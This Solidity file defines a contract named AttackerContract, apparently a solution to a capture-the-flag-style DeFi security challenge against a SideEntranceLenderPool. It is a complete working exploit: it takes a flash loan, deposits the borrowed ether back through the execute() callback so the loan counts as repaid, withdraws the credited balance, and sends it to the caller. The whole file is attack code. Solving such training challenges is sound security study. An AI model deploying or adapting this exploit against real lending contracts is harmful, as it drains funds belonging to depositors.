pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract AttackerContract is IFlashLoanEtherReceiver {
    using Address for address payable;

    function flashLoan(address pool, uint256 amount) external {
        (bool success, ) = pool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)", 
                amount
            )
        );
        require(success, "FlashLoan call failed");

        (success, ) = pool.call(
            abi.encodeWithSignature(
                "withdraw()"
            )
        );
        require(success, "Withdraw call failed");

        msg.sender.sendValue(address(this).balance);
    }

    function execute() external payable override {
        (bool success, ) = msg.sender.call{value: msg.value}(
            abi.encodeWithSignature(
                "deposit()"
            )
        );
        require(success, "Deposit call failed");
    }


    // Allow deposits of ETH
    receive () external payable {}
}